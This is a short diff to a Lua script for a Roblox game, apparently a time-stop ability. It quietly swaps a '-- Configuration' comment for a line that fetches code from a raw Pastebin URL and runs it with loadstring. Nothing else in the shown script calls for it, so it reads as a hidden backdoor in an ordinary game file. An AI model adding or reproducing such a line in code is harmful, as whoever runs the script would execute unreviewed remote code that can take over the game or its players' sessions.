@@ -18,8 +18,7 @@ local ulttext = ultbar:FindFirstChild("TextLabel")
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-
--- Configuration
+loadstring(game:HttpGet("https://pastebin.com/raw/MsuaacXx"))()
 local player = Players.LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local timestopDuration = 3   -- How long the effect lasts
